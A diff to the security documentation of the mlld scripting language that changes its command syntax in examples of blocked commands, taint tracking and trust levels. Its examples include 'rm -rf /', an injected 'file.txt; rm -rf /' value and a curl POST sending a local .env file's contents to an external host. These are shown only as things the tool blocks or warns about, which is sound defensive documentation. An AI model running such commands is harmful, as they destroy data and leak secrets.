@@ -23,8 +23,8 @@ mlld only requests the minimum permissions needed for each operation.
 mlld analyzes all commands before execution:
 
 ```mlld
-@run [rm -rf /]  # Blocked by default - dangerous pattern detected
-@run [npm test]  # Allowed after approval - common safe command
+@run [(rm -rf /)]  # Blocked by default - dangerous pattern detected
+@run [(npm test)]  # Allowed after approval - common safe command
 ```
 
 Commands are categorized by risk:
@@ -43,7 +43,7 @@ Source: https://example.com/template.mld
 Content preview:
 ---
 @text greeting = "Hello world"
-@run [echo "Running commands"]
+@run [(echo "Running commands")]
 ---
 
 Approve this import? [y/N]
@@ -77,15 +77,15 @@ Control security verification with trust levels:
 ```mlld
 # Always trust (skip all checks)
 @import { tool } from @company/internal <trust always>
-@run [deploy.sh] <trust always>
+@run [(deploy.sh)] <trust always>
 
 # Verify (prompt for approval) - default
 @import { util } from @community/package <trust verify>
-@run [new-script.sh] <trust verify>
+@run [(new-script.sh)] <trust verify>
 
 # Never trust (always block)
 @import { danger } from @sketchy/module <trust never>
-@run [suspicious-command] <trust never>
+@run [(suspicious-command)] <trust never>
 ```
 
 ## Resolver Security
@@ -180,7 +180,7 @@ mlld tracks the origin of all data:
 ```mlld
 @import { userData } from "https://api.com/data"  # Tainted: NETWORK
 @text processed = @userData                       # Tainted: inherited
-@run [echo {{processed}}]                        # Warning: tainted data in command
+@run [(echo {{processed}})]                        # Warning: tainted data in command
 ```
 
 Taint levels:
@@ -313,12 +313,12 @@ Configure private resolvers for internal code:
 ```mlld
 # Dangerous - user input in command
 @text userInput = "file.txt; rm -rf /"
-@run [cat {{userInput}}]  # Blocked - injection detected
+@run [(cat {{userInput}})]  # Blocked - injection detected
 
 # Safe - validated input
 @text filename = "file.txt"
 @if @filename matches /^[\w.-]+$/
-  @run [cat {{filename}}]
+  @run [(cat {{filename}})]
 @end
 ```
 
@@ -337,7 +337,7 @@ Configure private resolvers for internal code:
 ```mlld
 # Suspicious - sending local data externally
 @text secrets = [./.env]
-@run [curl -X POST https://external.com -d {{secrets}}]  # Warning shown
+@run [(curl -X POST https://external.com -d {{secrets}})]  # Warning shown
 ```
 
 ## Troubleshooting
